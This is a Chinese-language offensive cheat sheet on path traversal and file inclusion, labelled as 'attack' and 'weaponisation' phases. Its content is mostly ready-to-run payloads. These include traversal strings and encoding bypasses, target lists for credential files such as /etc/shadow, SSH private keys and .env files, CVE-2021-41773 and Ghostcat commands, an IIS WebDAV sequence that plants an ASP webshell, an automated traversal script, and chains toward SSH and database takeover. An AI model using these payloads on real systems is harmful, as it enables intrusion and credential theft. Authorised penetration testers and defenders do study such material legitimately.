/proc/self/cmdline         # 当前进程命令行
/proc/sched_debug          # 进程调度信息
/proc/mounts               # 挂载信息
/proc/net/arp              # ARP 表 (内网探测)
/proc/net/tcp              # TCP 连接
/proc/net/udp              # UDP 连接
/proc/net/fib_trie         # 路由表

---

# 注: /proc/self/fd 可能编号不同 → 有爆破空间
```

---

### 5.2 PHPInfo + LFI → 临时文件包含

```
条件:
1. 存在 phpinfo() 页面
2. 存在 LFI
3. PHP 允许文件上传 (即使上传功能不能用)

利用:
1. 发送含 PHP 代码的 multipart/form-data 请求到 phpinfo 页面
2. PHP 会创建临时文件 /tmp/phpXXXXXX → 在 phpinfo 输出中可见
3. 可见后立即用 LFI 包含临时文件 (竞争)
4. 得 RCE

工具: https://github.com/roughiz/lfito_rce
```

---

---

## 相关参考
- 路径遍历与文件包含常组合使用 → `path-traversal-lfi.md`
- LFI 包含 Webshell 执行命令 → `injection.md`

*参考: PayloadAllTheThings + HackTricks + 实战案例*

---

## 目录遍历 (Directory Traversal) 实战参考
- 文件包含 (LFI/RFI) 进阶利用 → `path-traversal-lfi.md`

> 阶段分离: [攻击] 路径穿越检测+编码绕过 → [利用] 敏感文件读取/源码泄露/配置窃取
> 覆盖: 目录列表泄露 → 路径规范化绕过 → 编码绕过 → 绝对/相对路径穿越 → 各Web服务器特性

> **last_updated**: 2026-06-04 | **tested_against**: Apache 2.4, Nginx 1.24, IIS 10, Python Flask
---

---

## 攻击阶段 — 检测与识别

---

## 1. 目录遍历 vs 文件包含 区别

```
目录遍历 (Directory Traversal / Path Traversal):
  → 读取文件内容 (不执行代码)
  → /etc/passwd, web.config, 源码文件
  → 本质: 文件读取漏洞

文件包含 (LFI / RFI):
  → 包含并执行文件中的代码
  → PHP伪协议, 日志投毒 → RCE
  → 本质: 代码执行漏洞

本参考专注目录遍历; LFI内容见 path-traversal-lfi.md
```

---

## 2. 快速检测

---

### 2.1 基础 Payload

```bash

---

# === Linux 路径穿越 ===
?file=../../../../etc/passwd
?file=../../../etc/passwd
?file=/etc/passwd                    # 绝对路径
?file=....//....//....//etc/passwd   # 序列化绕过
?file=..%2f..%2f..%2fetc%2fpasswd   # URL编码

---

# === Windows 路径穿越 ===
?file=..\..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\Windows\win.ini            # 绝对路径
?file=....\\....\\....\\windows\\win.ini

---

# === 参数名常见形式 ===
?file=       ?path=       ?document=
?download=   ?load=       ?read=
?template=   ?include=    ?page=
?dir=        ?folder=     ?src=
?filename=   ?f=          ?name=
```

---

### 2.2 确认性检测

```bash

---

# 确认1: 能读 /etc/passwd → 目录遍历确认
curl "https://target.com/download?file=../../../../etc/passwd"

---

# 确认2: 比较正常响应和异常响应

---

# 正常: ?file=profile.jpg → 200, 图片二进制

---

# 异常: ?file=../../../../etc/passwd → 200, 文本内容 → ★ 确认

---

# 确认3: 读取自身文件 (对比源码)
curl "https://target.com/download?file=download.php"

---

# → 读到了download.php源码 → 确认
```

---

---

## 3. 目录列表泄露 (Directory Listing)

---

### 3.1 Apache 目录列表检测

```bash

---

# === Apache 默认开启目录列表 (Options Indexes) ===
curl "https://target.com/uploads/"
curl "https://target.com/images/"
curl "https://target.com/assets/"
curl "https://target.com/backup/"

---

# 如果返回类似:

---

# <h1>Index of /uploads</h1>

---

# <ul><li>..</li><li>file1.jpg</li></ul>

---

# → ★ 目录列表启用

---

# === 常见泄露目录 ===
/admin/       /backup/     /uploads/
/images/     /css/        /js/
/logs/       /temp/       /tmp/
/config/     /includes/   /vendor/
/wp-content/  /static/     /assets/
/data/       /files/      /storage/
```

---

### 3.2 Nginx 目录列表检测

```bash

---

# Nginx 默认关闭 autoindex, 但如果开启:
curl "https://target.com/files/"
curl "https://target.com/static/"

---

# Nginx 目录页特征:

---

# <html><head><title>Index of /</title></head><body>
```

---

### 3.3 IIS 目录列表

```bash

---

# IIS 目录浏览开启时:
curl "https://target.com/images/"

---

# 返回特征:

---

# <pre><A HREF="/images/">[To Parent Directory]</A>
```

---

### 3.4 探测隐藏目录

```bash

---

# 目录列表关闭时, 用返回码判断:

---

# 200 → 目录存在且有默认页

---

# 403 → 目录存在但无默认页且列表关闭 → ★ 有价值

---

# 404 → 目录不存在

---

# 批量探测:
for dir in admin backup uploads logs config includes; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$dir/")
  echo "$dir → $code"
done
```

---

---

## 利用阶段 — 武器化

---

## 4. 路径穿越深度探测

---

### 4.1 确定路径深度

```bash

---

# === 从浅到深测试 ===

---

# 假设页面路径: /var/www/html/app/view.php

curl "https://target.com/view?file=../etc/passwd"            # 深度1
curl "https://target.com/view?file=../../etc/passwd"         # 深度2
curl "https://target.com/view?file=../../../etc/passwd"      # 深度3
curl "https://target.com/view?file=../../../../etc/passwd"   # 深度4
curl "https://target.com/view?file=../../../../../etc/passwd"# 深度5

---

# 哪个深度读到/etc/passwd → 确认深度N

---

# 一般 Web 根目录深度: 2-5层
```

---

### 4.2 常见 Web 根路径

```bash

---

# === Linux (Apache/Nginx) ===
/var/www/html/
/var/www/
/usr/share/nginx/html/
/usr/local/apache2/htdocs/
/opt/lampp/htdocs/
/home/*/public_html/

---

# === Linux (Tomcat) ===
/usr/local/tomcat/webapps/
/var/lib/tomcat/webapps/

---

## 5. 敏感文件读取清单

---

### 5.1 Linux 高价值文件

```bash

---

## === 系统文件 ===
/etc/passwd              # 用户列表
/etc/shadow              # ★ 密码哈希 (需root)
/etc/group               # 组信息
/etc/hosts               # 内网映射
/etc/resolv.conf         # DNS配置
/etc/crontab             # 定时任务
/etc/fstab               # 挂载信息

---

## === SSH ===
/home/*/.ssh/id_rsa      # ★ 私钥
/home/*/.ssh/id_ed25519
/home/*/.ssh/authorized_keys
/home/*/.ssh/known_hosts  # 内网主机信息

---

## === Web 配置 ===
/var/www/html/.env       # ★ 数据库密码/API密钥
/var/www/html/.env.production
/var/www/html/config.php
/var/www/html/wp-config.php    # WordPress
/var/www/html/.htaccess        # Apache重写规则

---

## === 应用配置 ===
/etc/php/*/apache2/php.ini    # PHP配置
/etc/nginx/nginx.conf          # Nginx配置
/etc/apache2/apache2.conf      # Apache配置
/etc/mysql/my.cnf              # MySQL配置
/etc/redis/redis.conf          # Redis配置

---

## === 日志 ===
/var/log/apache2/access.log    # 可能含Token/URL
/var/log/nginx/access.log
/var/log/auth.log              # SSH登录历史
/var/log/syslog

---

## === 进程/内核 ===
/proc/self/environ             # 环境变量 (可能含密码)
/proc/self/cmdline             # 启动命令
/proc/1/cmdline                # PID 1 命令
/proc/version                  # 内核版本
```

---

### 5.2 Windows 高价值文件

```bash

---

## === 系统 ===
C:\Windows\win.ini           # 验证性读取
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini                  # XP/2003

---

## === Web 服务器 ===
C:\inetpub\wwwroot\web.config          # ★ IIS配置 + 数据库密码
C:\xampp\htdocs\config.php
C:\xampp\passwords.txt                 # XAMPP默认密码!

---

## === 应用配置 ===
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
C:\Program Files\Apache Software Foundation\Tomcat\conf\server.xml
C:\Program Files\MySQL\MySQL Server 5.7\my.ini

---

## === 远程管理 ===
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\xampp\FileZillaFTP\FileZilla Server.xml

---

## === RDP/VNC ===
C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\
C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\
```

---

### 5.3 Java/PHP 应用特定文件

```bash

---

## === Spring Boot ===
/WEB-INF/classes/application.properties   # ★ 数据库配置
/WEB-INF/classes/application.yml
/WEB-INF/web.xml                          # 应用配置
/WEB-INF/classes/db.properties

---

## === Struts2 ===
/WEB-INF/classes/struts.xml
/WEB-INF/struts-config.xml

---

## === PHP ===
/config/database.php
/config/database.yml
/application/config/database.php
/app/config/parameters.yml
```

---

---

## 6. 路径穿越绕过技术

---

### 6.1 编码绕过

```bash

---

## === URL 编码 ===
../     → %2e%2e%2f
..\     → %2e%2e%5c

---

## === 双重URL编码 ===
../     → %252e%252e%252f    (%25解码=%, 剩下%2e%2e%2f → ../)

---

## === 三重编码 (极少见) ===
../     → %25252e%25252e%25252f

---

## === Unicode 编码 ===
../     → ..%c0%af            # 宽字节截断
../     → ..%ef%bc%8f         # 全角斜线

---

## === UTF-8 变长编码 (IIS 特殊) ===
../     → %c0%ae%c0%ae%c0%af
../     → %c0%ae%c0%ae/      # 混合
```

---

### 6.2 序列化/规范化绕过

```bash

---

## === ....// 绕过 (过滤../后剩../) ===

---

## 过滤函数只去除一次 ../ → 巧妙构造
....//          → 去掉 ../ → ../
..././          → 去掉 ../ → ../
....\/          → 去掉 ..\ → ..\

---

## === 多次递归 ===
....//....//....//etc/passwd
..././..././..././etc/passwd

---

## === 通配符 (特殊场景) ===
..*/..*/..*/etc/passwd
```

---

### 6.3 绝对路径前缀绕过

```bash

---

## === 必须 /var/www/html/ 开头 ===

---

## 利用路径规范化:
/var/www/html/../../../../etc/passwd
/var/www/html/../../../etc/passwd

---

## === Tomcat /WEB-INF 路径保护 ===

---

## /WEB-INF/ 目录默认不可访问 → 路径穿越
..;/WEB-INF/web.xml        # Tomcat 路径参数
..%252fWEB-INF%252fweb.xml
```

---

### 6.4 后缀限制绕过

```bash

---

## === 必须 .php / .jpg 结尾 ===

---

## 空字节截断 (PHP <5.3.4):
?file=../../../../etc/passwd%00.jpg

---

## 路径规范化:
?file=../../../../etc/passwd/.              # 末尾加 /.
?file=../../../../etc/passwd/               # 末尾加 /
?file=../../../../etc/passwd/..              # 路径回退

---

## URL 锚点:
?file=../../../../etc/passwd%23.jpg         # # = %23, 截断

---

## 问号截断 (查询参数):
?file=../../../../etc/passwd?.jpg           # ? 后变为查询参数
```

---

### 6.5 关键字/敏感词过滤绕过

```bash

---

## === etc 被过滤 ===
?file=../../../../e\tc/passwd               # 反斜杠
?file=../../../../et%63/passwd              # URL编码 c
?file=../../../../ETC/passwd                # 大小写

---

## === passwd 被过滤 ===
?file=../../../../etc/passw%64              # URL编码 d
?file=../../../../etc/passwd.bak            # 备用文件

---

## === ../ 被完全过滤 ===
?file=/etc/passwd                           # ★ 绝对路径
?file=....//....//....//etc/passwd
?file=..%252f..%252f..%252fetc%252fpasswd   # 双重编码
```

---

---

## 7. Web 服务器特性利用

---

### 7.1 Apache 特性

```bash

---

## === Apache 路径规范化绕过 ===

---

## CVE-2021-41773 / CVE-2021-42013 (Apache 2.4.49/2.4.50)
curl --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

---

## === Tomcat AJP 幽灵猫 (CVE-2020-1938) ===

---

## AJP端口 (默认8009) 未授权访问 → 读取 WEB-INF 下文件
python3 ghostcat.py target.com

---

## === mod_jk 路径穿越 ===

---

## /jkstatus 管理页面泄露 + 路径穿越
```

---

### 7.2 Nginx 特性

```bash

---

## === Nginx 路径穿越 (alias配置错误) ===

---

## 配置: location /files/ { alias /var/www/uploads/; }

---

## 漏洞: /files../html/index.php → /var/www/uploads/../html/index.php
curl "https://target.com/files../html/index.php"

---

## === Nginx 空字节截断 (旧版 <0.8.41) ===
curl "https://target.com/file.php%00.txt"

---

## === Nginx 配置读取 ===

---

## 目录列表关闭但配置文件路径可猜:
curl "https://target.com/../etc/nginx/sites-enabled/default"
```

---

### 7.3 IIS 特性

```bash

---

## === IIS 分号截断 (IIS6 经典) ===

---

## /shell.asp;.jpg → 当ASP解析

---

## 也可用于路径穿越:
curl "https://target.com/download?file=..\..\windows\win.ini;.jpg"

---

## === IIS 短文件名 (8.3格式) ===

---

## web.config → web~1.con
curl "https://target.com/web~1.con"

---

## === IIS WebDAV (PUT+MOVE) ===

---

## 启用WebDAV的IIS → PUT上传 → MOVE穿越目录
curl -X PUT "https://target.com/shell.txt" -d "<%eval request(1)%>"
curl -X MOVE "https://target.com/shell.txt" -H "Destination: https://target.com/shell.asp"
```

---

### 7.4 其他框架特性

```bash

---

## === Spring Boot Actuator ===

---

## 路径穿越读取配置 (某些版本)
curl "https://target.com/actuator/..;/env"

---

## === Flask/Django ===

---

## Debug模式下可能泄露路径 + 源码
curl "https://target.com/console"           # Flask Werkzeug Console

---

## Django:
curl "https://target.com/..%2f..%2f..%2fetc/passwd"

---

## === Node.js Express ===

---

## 静态文件路径穿越
curl --path-as-is "https://target.com/static/../package.json"
curl --path-as-is "https://target.com/static/..%2f..%2fapp.js"
```

---

---

## 8. 自动化检测工具

---

### 8.1 手工自动化脚本

```bash
#!/bin/bash

---

## traverse.sh — 路径穿越自动化检测

TARGET="${1:?Usage: $0 <url_with_FILE_PARAM>}"

---

## e.g., ./traverse.sh "https://target.com/download?file=FILE"

---

## 敏感文件清单
FILES=(
  "/etc/passwd"
  "/etc/hosts"
  "/etc/hostname"
  "C:/Windows/win.ini"
  "/proc/self/environ"
  ".env"
  ".git/HEAD"
  "web.config"
  "WEB-INF/web.xml"
)

---

## 路径深度尝试
DEPTHS=(1 2 3 4 5 6)

for file in "${FILES[@]}"; do
  for depth in "${DEPTHS[@]}"; do
    # 构造 ../ 序列
    dots=$(printf '../%.0s' $(seq 1 $depth))
    payload="${dots}${file}"

    # URL编码
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")

    url="${TARGET/FILE/$encoded}"
    size=$(curl -s -o /dev/null -w "%{size_download}" "$url")

    if [ "$size" -gt 100 ]; then
      echo "[+] $url → $size bytes"
    fi
  done
done
```

---

### 8.2 专用工具

```bash

---

## === dotdotpwn (Perl) — 经典目录穿越Fuzzer ===
dotdotpwn.pl -m http -h target.com -M GET -x 8080 -f /etc/passwd \
  -k "root:" -b -q -d 5

---

## === dirsearch ===
python3 dirsearch.py -u "https://target.com/file?x=" --wordlist=traversal.txt

---

## === ffuf ===
ffuf -u "https://target.com/download?file=FUZZ" \
  -w traversal_payloads.txt -t 100
```

---

---

## 9. 实战技巧

---

### 9.1 响应分析判断成功

```bash

---

## Linux /etc/passwd → 包含 "root:"

---

##   root:x:0:0:root:/root:/bin/bash → ★ 确认

---

## Windows win.ini → 包含 "[fonts]"

---

##   [fonts] → ★ 确认

---

## .env 文件 → 包含 "DB_PASSWORD="

---

##   DB_PASSWORD=secret123 → ★ 泄露

---

## 配置文件 → 包含 "<?php" 或 "<configuration>"
```

---

### 9.2 文件编码处理

```bash

---

## Base64 编码输出 (配合 PHP filter):
curl "https://target.com/view?file=php://filter/convert.base64-encode/resource=../../etc/passwd"

---

## 返回 base64 → 解码:
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==" | base64 -d

---

## 二进制文件 → hexdump 查看
curl -s "https://target.com/download?file=../../app.dll" | xxd | head -20
```

---

---

## 10. 漏洞链：目录遍历 → 升级利用

| 组合链 | 方式 | 结果 |
|--------|------|------|
| 目录遍历 → 日志读取 | 读access.log → 获取Token/Session | 会话劫持 |
| 目录遍历 → 源码读取 | 读.php/.java源码 → 审计 | 找其他漏洞 |
| 目录遍历 → 配置读取 | 读.env/web.config → 数据库密码 | 数据库接管 |
| 目录遍历 → SSH密钥 | 读id_rsa → SSH登录 | 服务器权限 |
| 目录遍历 → 审计源码 | 读控制器代码 → 发现隐藏API | 攻击面扩大 |
| 目录遍历 → LFI | 读到的源码含file inclusion | RCE |

---

---

## 相关参考
- 文件包含 (LFI/RFI) 进阶利用 → `path-traversal-lfi.md`

*参考: OWASP Path Traversal + CWE-22/23/35/36 + 实战案例 + PayloadAllTheThings*